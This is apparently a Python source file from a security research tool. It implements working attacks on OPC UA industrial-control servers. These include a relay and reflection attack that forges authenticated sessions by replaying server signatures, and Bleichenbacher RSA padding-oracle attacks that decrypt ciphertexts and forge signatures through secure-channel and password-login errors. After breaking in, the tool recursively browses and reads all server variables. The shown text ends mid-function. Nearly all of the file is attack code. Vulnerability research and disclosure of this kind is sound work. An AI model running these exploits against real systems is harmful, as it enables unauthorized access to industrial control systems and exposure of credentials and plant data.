import requests
requests.packages.urllib3.disable_warnings()

from Crypto.PublicKey.RSA import RsaKey

from messages import *
from message_fields import *
from typing import *
from crypto import *
from datetime import datetime
from socket import socket, create_connection, SHUT_RDWR
from random import Random, randint
from enum import Enum, auto
from binascii import hexlify, unhexlify
from base64 import b64encode, b64decode
from datetime import datetime, timedelta

import sys, os, itertools, re, math, hashlib

# Logging and errors.
def log(msg : str):
  print(f'[*] {msg}', file=sys.stderr)
  
def log_success(msg : str):
  print(f'[+] {msg}')
  
# Self signed certificate template (DER encoded) used for path injection attack.
SELFSIGNED_CERT_TEMPLATE = b64decode('MIIE6TCCA9GgAwIBAgIKEtz1iOEt2W2zvjANBgkqhkiG9w0BAQsFADB9MSAwHgYKCZImiZPyLGQBGRMQdHRlcnZvb3J0LXNlY3VyYTEXMBUGA1UEChMOT1BDIEZvdW5kYXRpb24xEDAOBgNVBAgTB0FyaXpvbmExCzAJBgNVBAYTAlVTMSEwHwYDVQQDExhDb25zb2xlIFJlZmVyZW5jZSBDbGllbnQwHhcNMjQwMzEwMDAwMDAwWhcNMjUwMzEwMDAwMDAwWjB9MSAwHgYKCZImiZPyLGQBGRMQdHRlcnZvb3J0LXNlY3VyYTEXMBUGA1UEChMOT1BDIEZvdW5kYXRpb24xEDAOBgNVBAgTB0FyaXpvbmExCzAJBgNVBAYTAlVTMSEwHwYDVQQDExhDb25zb2xlIFJlZmVyZW5jZSBDbGllbnQwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCVZar5gJGUm88hIcuTautbRnZ/TvBx4nezaab9djeHTCmx0EezCS/2LSAnCv3uYumvpvd5s03eEPfQ0s26wKqgUj4eKCn2XTukaORJu/jb9mGoD40bRwrMDMxW5CpHZ0xFgnyKHb3QbzzvwFwGTx1bXGz9xMe+J9r5mNzsHVZ46aVOScOrF44ZyRwbNkWAhIiXKgrJoHLKA6LN6iBA+kkKTZc7q+GsoEM5O4pwAXATqMGmsFaV/I05x7CckrNgUVZfT2PwwRMZ1hKITu1Z/Jti6dUzxyF5qWFoL5TDNKFQYPtR13LaQpQkzUqkw8VkUeBiT+hFsiT4GkYuo9Emv9TxAgMBAAGjggFpMIIBZTAMBgNVHRMBAf8EAjAAMB0GA1UdDgQWBBTJcPReZqL1YOptopao2c+m/nvp8DCBsQYDVR0jBIGpMIGmgBTJcPReZqL1YOptopao2c+m/nvp8KGBgaR/MH0xIDAeBgoJkiaJk/IsZAEZExB0dGVydm9vcnQtc2VjdXJhMRcwFQYDVQQKEw5PUEMgRm91bmRhdGlvbjEQMA4GA1UECBMHQXJpem9uYTELMAkGA1UEBhMCVVMxITAfBgNVBAMTGENvbnNvbGUgUmVmZXJlbmNlIENsaWVudIIKEtz1iOEt2W2zvjAOBgNVHQ8BAf8EBAMCAvQwIAYDVR0lAQH/BBYwFAYIKwYBBQUHAwEGCCsGAQUFBwMCMFAGA1UdEQRJMEeGM3Vybjp0dGVydm9vcnQtc2VjdXJhOlVBOlF1aWNrc3RhcnRzOlJlZmVyZW5jZUNsaWVudIIQdHRlcnZvb3J0LXNlY3VyYTANBgkqhkiG9w0BAQsFAAOCAQEAjw9zu/9SPD6iOex67jS/xaKc7JhWTa7JBZjY7xPYEhnxSwkyMW7I8AkAK/d5w9/WJl0I2dTlZ8ftKKUFjOV7TrNhT2TNuYVqq9OZQhJYKEPmfUhb5oAHqGLWCixyDfiez69hLii0QT5qVYi5rR5S+C0KQ3uNXRt3subM3edND9LSuUc3DTfc2r6ZFQ9SR0Y0BCf3gLyB7VPrVKxpKspNjTv/5y3dSI4q1VNA+q8OaXxSVUVlTN/Nlg8euWELiHeGGHu3EKqje1swN4cLXoSWfhn6qW/x/PvcUZMvK2xrukrR1f1SR/R9gZm0SKeEEq0nRrn1ASPB5sMtOWPxdruSKA==')

# Fixed clientNonce value used within spoofed OpenSecureChannel requests.
SPOOFED_OPN_NONCE = unhexlify('1337133713371337133713371337133713371337133713371337133713371337')

# Thrown when an attack was not possible due to a configuration that is not vulnerable to it (other exceptions indicate 
# unexpected errors, which can have all kinds of causes). 
class AttackNotPossible(Exception):
  pass
  
# Protocols supported for current attacks.
class TransportProtocol(Enum):
  TCP_BINARY = auto()
  HTTPS = auto()
  
def proto_scheme(protocol : TransportProtocol) -> str:
  return {
    TransportProtocol.TCP_BINARY: "opc.tcp",
    TransportProtocol.HTTPS     : "https",
  }[protocol]
  
def parse_endpoint_url(url):
  m = re.match(r'(?P<scheme>[\w.]+)://(?P<host>[^:/]+):(?P<port>\d+)', url)
  if not m:
    raise Exception(f'Don\'t know how to process endpoint url: {url}')
  else:
    protos = {
      "opc.tcp": TransportProtocol.TCP_BINARY,
      "https"  : TransportProtocol.HTTPS,
    }
    if m.group('scheme') not in protos:
      raise Exception(f'Unsupported protocol: "{m.group("scheme")}" in URL {url}.')
    return (protos[m.group('scheme')], *m.group('host', 'port'))

# Common routines.

# Send an OPC request message and receive a response.
def opc_exchange(sock : socket, request : OpcMessage, response_obj : Optional[OpcMessage] = None) -> OpcMessage:
  with sock.makefile('rwb') as sockio:
    sockio.write(request.to_bytes())
    sockio.flush()
    response = response_obj or request.__class__()
    response.from_bytes(sockio)
    return response
    

# Sets up a binary TCP connection, does a plain hello and simply ignores the server's size and chunking wishes.
def connect_and_hello(host : str, port : int) -> socket:
  sock = create_connection((host,port))
  opc_exchange(sock, HelloMessage(
    version=0,
    receiveBufferSize=2**16,
    sendBufferSize=2**16,
    maxMessageSize=2**24,
    maxChunkCount=2**8,
    endpointUrl=f'opc.tcp://{host}:{port}/',
  ), AckMessage())
  return sock

def simple_requestheader(authToken : NodeId = NodeId(0,0)) -> requestHeader.Type:
  return requestHeader.create(
    authenticationToken=authToken,
    timeStamp=datetime.now(),
    requestHandle=0,
    returnDiagnostics=0,
    auditEntryId=None,
    timeoutHint=0,
    additionalHeader=None,
  )

@dataclass
class ChannelState:
  sock : socket
  channel_id: int
  token_id : int
  msg_counter : int
  crypto: Optional[SessionCrypto]

# Attempt to start a "Secure" channel with no signing or encryption.
def unencrypted_opn(sock: socket) -> ChannelState:
  reply = opc_exchange(sock, OpenSecureChannelMessage(
    secureChannelId=0,
    securityPolicyUri=SecurityPolicy.NONE,
    senderCertificate=None,
    receiverCertificateThumbprint=None,
    encodedPart=encodedConversation.to_bytes(encodedConversation.create(
      sequenceNumber=1,
      requestId=1,
      requestOrResponse=openSecureChannelRequest.to_bytes(openSecureChannelRequest.create(
        requestHeader=simple_requestheader(),
        clientProtocolVersion=0,
        requestType=SecurityTokenRequestType.ISSUE,
        securityMode=MessageSecurityMode.NONE,
        clientNonce=None,
        requestedLifetime=3600000,
      ))
    ))
  ))
  
  convrep, _ = encodedConversation.from_bytes(reply.encodedPart)
  resp, _ = openSecureChannelResponse.from_bytes(convrep.requestOrResponse)
  return ChannelState(
    sock=sock,
    channel_id=resp.securityToken.channelId,
    token_id=resp.securityToken.tokenId,
    msg_counter=2,
    crypto=None,
  )
  
# Do a  OPN protocol with a certificate and private key.
def authenticated_opn(sock : socket, endpoint : endpointDescription.Type, client_certificate : bytes, privkey : RsaKey) -> ChannelState:
  sp = endpoint.securityPolicyUri
  pk = certificate_publickey(endpoint.serverCertificate)
  
  if sp == SecurityPolicy.NONE:
    return unencrypted_opn(sock)
  else:
    client_nonce = os.urandom(32)
    plaintext = encodedConversation.to_bytes(encodedConversation.create(
      sequenceNumber=1,
      requestId=1,
      requestOrResponse=openSecureChannelRequest.to_bytes(openSecureChannelRequest.create(
        requestHeader=simple_requestheader(),
        clientProtocolVersion=0,
        requestType=SecurityTokenRequestType.ISSUE,
        securityMode=endpoint.securityMode,
        clientNonce=client_nonce,
        requestedLifetime=3600000,
      ))
    ))
    msg = OpenSecureChannelMessage(
      secureChannelId=0,
      securityPolicyUri=sp,
      senderCertificate=client_certificate,
      receiverCertificateThumbprint=certificate_thumbprint(endpoint.serverCertificate),
      encodedPart=plaintext
    )
    padded_msg = pkcs7_pad(msg.to_bytes(), rsa_plainblocksize(sp, pk))
    signature = rsa_sign(sp, privkey, padded_msg)
    
    msg.encodedPart = b''
    ciphertext = rsa_ecb_encrypt(sp, pk, padded_msg[len(msg.to_bytes()):] + signature)
    msg.encodedPart = ciphertext
    
    replymsg = opc_exchange(sock, msg)
    convrep, _ = encodedConversation.from_bytes(rsa_ecb_decrypt(sp, privkey, reply.encodedPart))
    resp, _ = openSecureChannelResponse.from_bytes(convrep.requestOrResponse)
    
    return ChannelState(
      sock=sock,
      channel_id=resp.securityToken.channelId,
      token_id=resp.securityToken.tokenId,
      msg_counter=2,
      crypto=deriveKeyMaterial(sp, client_nonce, resp.serverNonce)
    )


# Exchange a conversation message, once the channel has been established by the OPN exchange.
def session_exchange(channel : ChannelState, 
                     reqfield : EncodableObjectField, respfield : EncodableObjectField, 
                     **req_data) -> NamedTuple:
  msg = ConversationMessage(
    secureChannelId=channel.channel_id,
    tokenId=channel.token_id,
    encodedPart=encodedConversation.to_bytes(encodedConversation.create(
      sequenceNumber=channel.msg_counter,
      requestId=channel.msg_counter,
      requestOrResponse=reqfield.to_bytes(reqfield.create(**req_data)),
    ))
  )
  
  crypto = channel.crypto
  if crypto:
    # Add padding and signing into encoded message.
    msgbytes = msg.to_bytes()
    padding = pkcs7_pad(msgbytes)[len(msgbytes):]
    mac = sha_hmac(crypto.policy, crypto.clientKeys.signingKey, msgbytes + padding)
    plaintext = msg.encodedPart + padding + mac
    
    # Encrypt encoded part.
    msg.encodedPart = aes_cbc_encrypt(crypto.clientKeys.encryptionKey, crypto.clientKeys.iv, plaintext)
    
  # Do the exchange.
  reply = opc_exchange(channel.sock, msg)
  
  if crypto:
    # Decrypt.
    plaintext = aes_cbc_encrypt(crypto.serverKeys.encryptionKey, crypto.serverKeys.iv, reply.encodedPart)
    
    # Remove signature and padding. Don't bother to validate.
    decodedPart = pkcs7_unpad(plaintext[:macsize(crypto.policy)])
  else:
    decodedPart = reply.encodedPart
    
  # Increment the message counter.
  channel.msg_counter += 1
    
  # Parse the response.
  convo, _ = encodedConversation.from_bytes(decodedPart)
  resp, _ = respfield.from_bytes(convo.requestOrResponse)
  return resp
  
# OPC exchange over HTTPS.
# https://reference.opcfoundation.org/Core/Part6/v105/docs/7.4
def https_exchange(
    url : str, nonce_policy : Optional[SecurityPolicy], 
    reqfield : EncodableObjectField, respfield : EncodableObjectField, 
    **req_data
  ) -> NamedTuple:
  headers = {
    'Content-Type': 'application/octet-stream',
  }
  if nonce_policy is not None:
    headers['OPCUA-SecurityPolicy'] =  f'http://opcfoundation.org/UA/SecurityPolicy#{nonce_policy.value}'
    
  reqbody = reqfield.to_bytes(reqfield.create(**req_data))
  http_resp = requests.post(url, verify=False, headers=headers, data=reqbody)
  return respfield.from_bytes(http_resp.content)[0]

# Picks either session_exchange or https_exchanged based on channel type.
def generic_exchange(
    chan_or_url : ChannelState | str, nonce_policy : Optional[SecurityPolicy], 
    reqfield : EncodableObjectField, respfield : EncodableObjectField, 
    **req_data
  ) -> NamedTuple:
    if type(chan_or_url) == ChannelState:
      return session_exchange(chan_or_url, reqfield, respfield, **req_data)
    else:
      assert type(chan_or_url) == str and chan_or_url.startswith('https://')
      return https_exchange(chan_or_url, nonce_policy, reqfield, respfield, **req_data)

# Request endpoint information from a server.
def get_endpoints(ep_url : str) -> List[endpointDescription.Type]:
  if ep_url.startswith('opc.tcp://'):
    _, host, port = parse_endpoint_url(ep_url)
    with connect_and_hello(host, port) as sock:
      chan = unencrypted_opn(sock)
      resp = session_exchange(chan, getEndpointsRequest, getEndpointsResponse, 
        requestHeader=simple_requestheader(),
        endpointUrl=ep_url,
        localeIds=[],
        profileUris=[],
      )
  else:
    assert(ep_url.startswith('https://'))
    resp = https_exchange(f'{ep_url.rstrip("/")}/discovery', None, getEndpointsRequest, getEndpointsResponse, 
        requestHeader=simple_requestheader(),
        endpointUrl=ep_url,
        localeIds=[],
        profileUris=[],
    )
      
  return resp.endpoints


# Performs the relay attack. Channels can be either OPC sessions or HTTPS URLs.
def execute_relay_attack(
    imp_chan : ChannelState | str, imp_endpoint : endpointDescription.Type,
    login_chan : ChannelState | str, login_endpoint : endpointDescription.Type,
    prefer_certauth : bool = False
  ) -> NodeId:
    def csr(chan, client_ep, server_ep, nonce):
      return generic_exchange(chan, server_ep.securityPolicyUri, createSessionRequest, createSessionResponse, 
        requestHeader=simple_requestheader(),
        clientDescription=client_ep.server,
        serverUri=server_ep.server.applicationUri,
        endpointUrl=server_ep.endpointUrl,
        sessionName=None,
        clientNonce=nonce,
        clientCertificate=client_ep.serverCertificate,
        requestedSessionTimeout=600000,
        maxResponseMessageSize=2**24,
      )

    # Send CSR to login_endpoint, pretending we're imp_endpoint. Use arbitrary nonce.
    createresp1 = csr(login_chan, imp_endpoint, login_endpoint, os.urandom(32))
    
    # Now send the server nonce of this channel as a client nonce on the other channel.
    createresp2 = csr(imp_chan, login_endpoint, imp_endpoint, createresp1.serverNonce)
    
    if createresp2.serverSignature.signature is None:
      raise AttackNotPossible('Server did not sign nonce. An OPN attack may be needed first.')
    
    # Make a token with an anonymous or certificate-based user identity policy.
    anon_policies = [p for p in login_endpoint.userIdentityTokens if p.tokenType == UserTokenType.ANONYMOUS]
    cert_policies = [p for p in login_endpoint.userIdentityTokens if p.tokenType == UserTokenType.CERTIFICATE]
    if anon_policies and not (prefer_certauth and cert_policies):
      usertoken = anonymousIdentityToken.create(policyId=anon_policies[0].policyId)
      usersig = signatureData.create(algorithm=None,signature=None)
    elif cert_policies:
      log('User certificate required. Reusing the server certificate to forge user token.')
      usertoken = x509IdentityToken.create(
        policyId=cert_policies[0].policyId, 
        certificateData=imp_endpoint.serverCertificate
      )
      
      # Simply reuse the clientSignature, since we're using the same cert and nonce for that.
      usersig = createresp2.serverSignature
    else:
      raise AttackNotPossible('Endpoint does not allow either anonymous or certificate-based authentication.')
    
    # Now activate the first session using the signature from the second session.
    generic_exchange(login_chan, login_endpoint.securityPolicyUri, activateSessionRequest, activateSessionResponse, 
      requestHeader=simple_requestheader(createresp1.authenticationToken),
      clientSignature=createresp2.serverSignature,
      clientSoftwareCertificates=[],
      localeIds=[],
      userIdentityToken=usertoken,
      userTokenSignature=usersig,
    )
    
    # Return auth token if succesful.
    return createresp1.authenticationToken

# Demonstrate access by recursively browsing nodes. Variables are read.
# Based on https://reference.opcfoundation.org/Core/Part4/v104/docs/5.8.2
def demonstrate_access(chan : ChannelState | str, authToken : NodeId, policy : SecurityPolicy = None):
  max_children = 100
  recursive_nodeclasses = {NodeClass.OBJECT}
  read_nodeclasses = {NodeClass.VARIABLE}
  
  def browse_from(root, depth):
    bresp = generic_exchange(chan, policy, browseRequest, browseResponse,
      requestHeader=simple_requestheader(authToken),
      view=viewDescription.default_value,
      requestedMaxReferencesPerNode=max_children,
      nodesToBrowse=[browseDescription.create(
        nodeId=root,
        browseDirection=BrowseDirection.FORWARD,
        referenceTypeId=NodeId(0,0), #NodeId(0, 33),
        includeSubtypes=True,
        nodeClassMask=0x00, # All classes
        resultMask=0x3f,    # All results
      )],
    )
    
    tree_prefix = ' ' * (depth - 1) + '|'
    for result in bresp.results:
      for ref in result.references:
        if ref.nodeClass in recursive_nodeclasses:
          # Keep browsing recursively.
          log_success(tree_prefix + f'+ {ref.displayName.text} ({ref.nodeClass.name})')
          browse_from(ref.nodeId.nodeId, depth + 1)
        elif ref.nodeClass in read_nodeclasses:
          # Read current variable value. For the sake of simplicity do one at a time.
          try:
            readresp = generic_exchange(chan, policy, readRequest, readResponse,
              requestHeader=simple_requestheader(authToken),
              maxAge=0,
              timestampsToReturn=TimestampsToReturn.BOTH,
              nodesToRead=[readValueId.create(
                nodeId=ref.nodeId.nodeId,
                attributeId=0x0d, # Request value
                indexRange=None,
                dataEncoding=QualifiedNameField().default_value,
              )],
            )
            
            for r in readresp.results:
              if type(r.value) == list:
                log_success(tree_prefix + f'+ {ref.displayName.text} (Array):')
                for subval in r.value:
                  log_success(' ' + tree_prefix + f'+ {ref.displayName.text}: "{subval}"')
              else:
                log_success(tree_prefix + f'- {ref.displayName.text}: "{r.value}"')
          except UnsupportedFieldException as ex:
            log_success(tree_prefix + f'- {ref.displayName.text}: <{ex.fieldname}>')
          except DecodeError as ex:
            log_success(tree_prefix + f'- {ref.displayName.text}: <decode error>')
          except Exception as ex:
            log_success(tree_prefix + f'- {ref.displayName.text}: <{type(ex)}>')
        else:
          log_success(tree_prefix + f'- {ref.displayName.text} ({ref.nodeClass.name})')
          
    if len(bresp.results) >= max_children:
      log_success(tree_prefix + '- ...')
    
  log('Trying to browse data via authenticated channel.')
  log('Tree: ')
  log_success('+ <root>')
  browse_from(NodeId(0, 84), 1)
  log('Finished browsing.') 

# Reflection attack: log in to a server with its own identity.
def reflect_attack(url : str, demo : bool):
  proto, host, port = parse_endpoint_url(url)
  log(f'Attempting reflection attack against {url}')
  endpoints = get_endpoints(url)
  log(f'Server advertises {len(endpoints)} endpoints.')
  
  # Try to attack against the first endpoint with an HTTPS transport and a non-None security policy.
  https_eps = [ep for ep in endpoints if ep.securityPolicyUri != SecurityPolicy.NONE and ep.transportProfileUri.endswith('https-uabinary')]
  if https_eps:
    target = https_eps[0]
    tproto, thost, tport = parse_endpoint_url(target.endpointUrl)
    assert tproto == TransportProtocol.HTTPS
    url = target.endpointUrl
    log(f'Targeting {url} with {target.securityPolicyUri.name} security policy.')
    token = execute_relay_attack(url, target, url, target)
    log_success(f'Attack succesfull! Authenticated session set up with {url}.')
    if demo:
      demonstrate_access(url, token, target.securityPolicyUri)
  else:
    raise AttackNotPossible('TODO: implement combination with OPN attack.')
      
def relay_attack(source_url : str, target_url : str, demo : bool):
  log(f'Attempting relay from {source_url} to {target_url}')
  seps = get_endpoints(source_url)
  log(f'Listed {len(seps)} endpoints from {source_url}.')
  teps = get_endpoints(target_url)
  log(f'Listed {len(teps)} endpoints from {target_url}.')
  
  # Prioritize HTTPS targets with a non-NONE security policy.
  teps.sort(key=lambda ep: [not ep.transportProfileUri.endswith('https-uabinary'), ep.securityPolicyUri == SecurityPolicy.NONE])
  
  tmpsock = None
  prefercert = False
  try:
    for sep, tep in itertools.product(seps, teps):
      # Source must be HTTPS and non-NONE.
      if sep.transportProfileUri.endswith('https-uabinary') and sep.securityPolicyUri != SecurityPolicy.NONE:
        oraclechan = sep.endpointUrl
        supports_usercert = any(p.tokenType == UserTokenType.CERTIFICATE for p in tep.userIdentityTokens)
        
        if tep.transportProfileUri.endswith('https-uabinary'):
          # HTTPS target.
          mainchan = tep.endpointUrl
        elif tep.transportProfileUri.endswith('uatcp-uasc-uabinary') and tep.securityPolicyUri == SecurityPolicy.NONE and supports_usercert:
          # When only a TCP target is available we can still try to spoof a user cert.
          _, thost, tport = parse_endpoint_url(tep.endpointUrl)
          tmpsock = connect_and_hello(thost, tport)
          mainchan = unencrypted_opn(tmpsock)
          prefercert = True
        else:
          continue
          
        log(f'Trying endpoints {sep.endpointUrl} ({sep.securityPolicyUri.name})-> {tep.endpointUrl} ({tep.securityPolicyUri.name})')
        token = execute_relay_attack(oraclechan, sep, mainchan, tep, prefercert)
        log_success(f'Attack succesfull! Authenticated session set up with {tep.endpointUrl}.')
        if demo:
          demonstrate_access(mainchan, token, tep.securityPolicyUri)
        return
    
    raise AttackNotPossible('TODO: implement combination with OPN attack.')
  except ServerError as err:
    if err.errorcode == 0x80550000 and target_url.startswith('opc.tcp'):
      raise AttackNotPossible('Security policy rejected by server. Perhaps user authentication over NONE channel is blocked.')
    else:
      raise err
  finally:
    if tmpsock:
      tmpsock.shutdown(SHUT_RDWR)
      tmpsock.close()
  
class PaddingOracle(ABC):
  def __init__(self, endpoint : endpointDescription.Type):
    self._endpoint = endpoint
    self._active = False
  
  @abstractmethod
  def _setup(self):
    ...
  
  @abstractmethod
  def _cleanup(self):
    ...
    
  @abstractmethod
  def _attempt_query(self, ciphertext : bool) -> bool:
    ...
    
  # Pick an applicable and preferred endpoint.
  @classmethod
  @abstractmethod
  def pick_endpoint(clazz, endpoints : List[endpointDescription.Type]) -> Optional[endpointDescription.Type]:
    ...
    
  def query(self, ciphertext : bytes):
    if self._active:
      try:
        return self._attempt_query(ciphertext)
      except KeyboardInterrupt as ex:
        # Don't retry when user CTRL+C's.
        raise ex
      except:
        # On any misc. exception, assume the connection is broken and reset it.
        try:
          self._cleanup()
        except:
          pass
    
    self._setup()
    self._active = True
    return self._attempt_query(ciphertext)
    
class OPNPaddingOracle(PaddingOracle):
  def _setup(self):
    proto, host, port = parse_endpoint_url(self._endpoint.endpointUrl)
    assert proto == TransportProtocol.TCP_BINARY
    self._socket = connect_and_hello(host, port)
    self._msg = OpenSecureChannelMessage(
      secureChannelId=0,
      securityPolicyUri=SecurityPolicy.BASIC128RSA15,
      senderCertificate=self._endpoint.serverCertificate,
      receiverCertificateThumbprint=certificate_thumbprint(self._endpoint.serverCertificate),
      encodedPart=b''
    )
    
  def _cleanup(self):
   self._socket.shutdown(SHUT_RDWR)
   self._socket.close()
   
  def _attempt_query(self, ciphertext):
    try:
      self._msg.encodedPart = ciphertext
      opc_exchange(self._socket, self._msg)
      return True
    except ServerError as err:
      # print(hex(err.errorcode))
      if err.errorcode == 0x80580000:
        return True
      elif err.errorcode == 0x80130000:
        return False
      else:
        raise err
      
  @classmethod
  def pick_endpoint(clazz, endpoints):
    for endpoint in endpoints:
      if endpoint.securityPolicyUri == SecurityPolicy.BASIC128RSA15 and endpoint.transportProfileUri.endswith('uatcp-uasc-uabinary'):
        return endpoint
        
    return None
    
class PasswordPaddingOracle(PaddingOracle):
  @classmethod
  def _preferred_tokenpolicy(_, endpoint):
    policies = sorted(endpoint.userIdentityTokens, reverse=True, 
      key=lambda t: (
        t.tokenType == UserTokenType.USERNAME, 
        t.securityPolicyUri == SecurityPolicy.BASIC128RSA15,
        t.securityPolicyUri is None or t.securityPolicyUri == SecurityPolicy.NONE,
      )
    )
    
    if policies and policies[0].tokenType == UserTokenType.USERNAME:
      return policies[0]
  
  
  def __init__(self, endpoint):
    super().__init__(endpoint)
    self._policyId = self._preferred_tokenpolicy(endpoint).policyId
  
  def _setup(self):
    proto, host, port = parse_endpoint_url(self._endpoint.endpointUrl)
    if proto == TransportProtocol.TCP_BINARY:
      sock = connect_and_hello(host, port)
      self._chan = unencrypted_opn(sock)
    else:
      assert proto == TransportProtocol.HTTPS
      self._chan = self._endpoint.endpointUrl
    
    # Just reflect session data during CreateSession.
    sresp = generic_exchange(self._chan, SecurityPolicy.NONE, createSessionRequest, createSessionResponse, 
      requestHeader=simple_requestheader(),
      clientDescription=self._endpoint.server,
      serverUri=self._endpoint.server.applicationUri,
      endpointUrl=self._endpoint.endpointUrl,
      sessionName=None,
      clientNonce=os.urandom(32),
      clientCertificate=self._endpoint.serverCertificate,
      requestedSessionTimeout=600000,
      maxResponseMessageSize=2**24,
    )
    self._header = simple_requestheader(sresp.authenticationToken)
    
  def _cleanup(self):
    if type(self._chan) == ChannelState:
      self._chan.sock.shutdown(SHUT_RDWR)
      self._chan.sock.close()

  def _attempt_query(self, ciphertext):
    token = userNameIdentityToken.create(
      policyId=self._policyId,
      userName='admin', # User probably does not need to exist; otherwise this is a likely guess
      password=ciphertext,
      encryptionAlgorithm='http://www.w3.org/2001/04/xmlenc#rsa-1_5',
    )
    
    try:
      generic_exchange(self._chan, SecurityPolicy.NONE, activateSessionRequest, activateSessionResponse, 
        requestHeader=self._header,
        clientSignature=signatureData.create(algorithm=None, signature=None),
        clientSoftwareCertificates=[],
        localeIds=[],
        userIdentityToken=token,
        userTokenSignature=signatureData.create(algorithm=None, signature=None),
      )
      return True
    except ServerError as err:
      # print(hex(err.errorcode))
      if err.errorcode == 0x80200000:
        # print('.', end='', file=sys.stderr, flush=True)
        return False
      elif err.errorcode == 0x80210000 or err.errorcode == 0x801f0000 or err.errorcode == 0x80b00000:
        return True
      else:
        raise err
        
  @classmethod
  def pick_endpoint(clazz, endpoints):
    # Only works with None security policy and password login support.
    options = [ep 
      for ep in endpoints if ep.securityPolicyUri == SecurityPolicy.NONE and \
      any(t.tokenType == UserTokenType.USERNAME for t in ep.userIdentityTokens)
    ]
    
    if not options:
      return None
    
    # Prefer endpoints that actually advertise PKCS#1 (if not, they may still accept it). 
    # Otherwise, prefer None over OAEP (upgrade more likely accepted than downgrade).
    # Security policies being equal, prefer binary transport.
    return max(options, 
      key=lambda ep: (
        clazz._preferred_tokenpolicy(ep).securityPolicyUri == SecurityPolicy.BASIC128RSA15,
        clazz._preferred_tokenpolicy(ep).securityPolicyUri in [None, SecurityPolicy.NONE],
        ep.transportProfileUri.endswith('uatcp-uasc-uabinary')
      )
    )

# Carry out a padding oracle attack against a Basic128Rsa15 endpoint.
# Result is ciphertext**d mod n (encoded big endian; any padding not removed).
# Can also be used for signature forging.
# Maybe TODO: optimizations from https://eprint.iacr.org/2012/417.pdf
def rsa_decryptor(oracle : PaddingOracle, certificate : bytes, ciphertext : bytes) -> bytes:  
  # Bleichenbacher's original attack: https://archiv.infsec.ethz.ch/education/fs08/secsem/bleichenbacher98.pdf
  clen = len(ciphertext)
  assert clen % 128 == 0 # Probably not an RSA ciphertext if the key size is not a multiple of 1024 bits.
  k = clen * 8
  
  # Ciphertext as integer.
  c = 0
  for by in ciphertext:
    c *= 256
    c += by
    
  # Extract public key from the endpoint certificate.
  n, e = certificate_publickey_numbers(certificate)
  
  # B encodes as 00 01 00 00 00 .. 00 00
  B = 2**(k-16)
  
  # Metrics for progress reporting.
  query_count = 0
  i = 0
    
  # Oracle function.
  def query(candidate):
    nonlocal query_count
    
    # Encode int as bigendian binary to submit it to the oracle.
    result = oracle.query(int2bytes(candidate, clen))
    
    # Report progress for every query.
    query_count += 1
    spinnything = '/-\\|'[(query_count // 30) % 4]
    print(f'[{spinnything}] Progress: iteration {i}; oracle queries: {query_count}', end='\r', file=sys.stderr, flush=True)
    
    return result
    
  # Division helper.
  ceildiv = lambda a,b: a // b + (a % b and 1)
    
  # Step 1: blinding. Find a random blind that makes the padding valid. Searching can be skipped if the ciphertext
  # already has valid padding.
  # print('step 1')
  if query(c):
    s0 = 1
    c0 = c
  else:
    while True:
      s0 = randint(1, n)
      c0 = c * pow(s0, e, n) % n
      if query(c0):
        # print(f'c0={c0}', flush=True)
        break
        
  test_factor = lambda sval: query(c0 * pow(sval, e, n) % n)
  
  M_i = {(2 * B, 3 * B - 1)}
  
  i = 1
  s_i = ceildiv(n, 3*B)

  while True:
    # Step 2: searching for PKCS#1 conforming messages.
    # print(f'step 2; i={i}; s_i={s_i}; M_i={[(hex(a), hex(b)) for a,b in M_i]}', flush=True)
    if i == 1:
      # 2a: starting the search.
      while not test_factor(s_i):
        s_i += 1
    elif len(M_i) > 1:
      # 2b: searching with more than one interval left
      s_i += 1
      while not test_factor(s_i):
        s_i += 1
    else:
      # 2c: searching with one interval left
      (a, b) = next(iter(M_i))
      r_i = ceildiv(2 * (b * s_i - 2 * B), n)
      done = False
      while not done:
        # print(f'r_i={r_i}; {ceildiv(2 * B + r_i * n, b)} <= new_s < {ceildiv(3 * B + r_i * n, a)}', file=sys.stderr, flush=True)
        for new_s in range(ceildiv(2 * B + r_i * n, b), ceildiv(3 * B + r_i * n, a)):
          if test_factor(new_s):
            s_i = new_s
            done = True
            break
        r_i += 1
    
    # Step 3: Narrowing the set of solutions.
    # print(f'step 3; s_i={s_i}',flush=True)
    M_i = {
      (max(a, ceildiv(2*B+r*n, s_i)), min(b, (3*B-1+r*n) // s_i))
        for a, b in M_i
        for r in range(ceildiv(a*s_i-3*B+1, n), (b*s_i-2*B) // n + 1)
    }
    
    # Step 4: Computing the solution.
    if len(M_i) == 1:
      # print(f'step 4',flush=True)
      a, b = next(iter(M_i))
      if a == b:
        print('', file=sys.stderr, flush=True)
        m = a * pow(s0, n - 2, n) % n
        return bytes([(m >> bits) & 0xff for bits in reversed(range(0, k, 8))])
    
    i += 1
  
  
def padding_oracle_quality(certificate : bytes, oracle : PaddingOracle) -> int:
  # Gives a score between 0 and 100 on how "strong" the padding oracle is.
  # This is determined by encrypting testing 100 plaintexts with correct padding and 100 with incorrect padding.
  # The score is based on the number of correct padding correctly reported as such is returned.
  # If any incorrectly padded plaintext is reported as valid, 0 is returned.
  # Will not catch PaddingOracle exceptions.
  
  # Extract public key from certificate as Python ints.
  keylen = certificate_publickey(certificate).size_in_bytes()
  n, e = certificate_publickey_numbers(certificate)
  
  # Generate test cases deterministically for consistent scoring.
  TESTCOUNT = 100
  TESTSEED = 0x424242
  rng = Random(TESTSEED)
  
  # For 'correct' test cases. First pick random padding size and then randomize both padding and data.
  datasizes = [rng.randint(0, keylen - 11) for _ in range(0, TESTCOUNT)]
  padvals = [sum(rng.randint(1,255) << (i * 8) for i in range(0, keylen - ds - 3)) for ds in datasizes]
  correctpadding = [
    (2 << 8 * (keylen - 2)) + \
    (padval << 8 * (ds + 1)) + \
    rng.getrandbits(8 * ds)
    for padval, ds in zip(padvals, datasizes)
  ]
  
  # As incorrect padding, just pick uniform random numbers modulo n not starting with 0x0002.
  wrongpadding = [rng.randint(1, n) for _ in range(0, TESTCOUNT)]
  for i in range(0, TESTCOUNT):
    while wrongpadding[i] >> (8 * (keylen - 2)) == 2:
      wrongpadding[i] = rng.randint(1, n)
  
  # Mix order of correct and incorrect padding.
  testcases = [(True, p) for p in correctpadding] + [(False, p) for p in wrongpadding]
  rng.shuffle(testcases)
  
  # Perform the test.
  score = 0
  for i, (padding_right, plaintext) in enumerate(testcases):
    progbar = '=' * (i // 2) + ' ' * (100 - i // 2)
    print(f'[*] Progress: [{progbar}]', file=sys.stderr, end='\r', flush=True)
    if oracle.query(int2bytes(pow(plaintext, e, n), keylen)):
      if padding_right:
        # Correctly identified valid padding.
